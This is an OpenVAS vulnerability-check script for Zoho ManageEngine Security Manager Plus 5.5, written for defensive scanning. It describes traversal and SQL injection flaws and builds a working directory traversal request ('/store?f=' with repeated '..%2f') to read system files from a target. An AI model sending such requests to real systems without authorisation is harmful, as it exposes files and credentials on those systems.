###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_manageengine_sec_mangr_plus_mult_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# Zoho ManageEngine Security Manager Plus Multiple Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to perform directory
  traversal attacks, read/download the arbitrary files and to manipulate
  SQL queries by injecting arbitrary SQL code.
  Impact Level: Application";
tag_affected = "ManageEngine Security Manager Plus version 5.5 build 5505 and prior";
tag_insight = "Multiple flaws are due to,
  - An input passed to the 'f' parameter via 'store' script is not properly
    sanitised before being used. This allows to download the complete database
    and thus gather logins which lead to uploading web site files which could
    be used for malicious actions
  - The SQL injection is possible on the 'Advanced Search', the input is not
    validated correctly.";
tag_solution = "No solution or patch is available as of 22th October, 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.manageengine.com/products/security-manager/";
tag_summary = "This host is running Zoho ManageEngine Security Manager Plus and is
  prone to multiple vulnerabilities.";

if(description)
{
  script_id(802483);
  script_version("$Revision: 12 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-10-22 13:33:50 +0530 (Mon, 22 Oct 2012)");
  script_name("Zoho ManageEngine Security Manager Plus Multiple Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/22092/");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/22093/");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/22094/");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/117520/manageenginesmp-sql.txt");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/117522/manageengine-sql.rb.txt");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/117519/manageenginemp-traversal.txt");

  script_description(desc);
  script_summary("Check if ManageEngine Security Manager Plus allows to read system files");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 6262);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Variable Initialization
port = 0;
files = "";

## Get HTTP Port
port = get_http_port(default:6262);
if(!port){
  port = 6262;
}

## Check port status
if(!get_port_state(port)) {
  exit(0);
}

## Confirm the application
if(http_vuln_check(port:port, url:"/SecurityManager.cc",
                   pattern:">Security Manager Plus</",
                   check_header:TRUE,  extra_check:'ZOHO Corp'))

{
  ## traversal_files() function Returns Dictionary (i.e key value pair)
  ## Get Content to be checked and file to be check
  files = traversal_files();
  if(!files){
    exit(0);
  }

  foreach file (keys(files))
  {
    ## Construct directory traversal attack
    url = "/store?f=" + crap(data:"..%2f",length:3*15) + files[file];

    ## Confirm exploit worked properly or not
    if(http_vuln_check(port:port, url:url,pattern:file))
    {
      security_hole(port:port);
      exit(0);
    }
  }
}
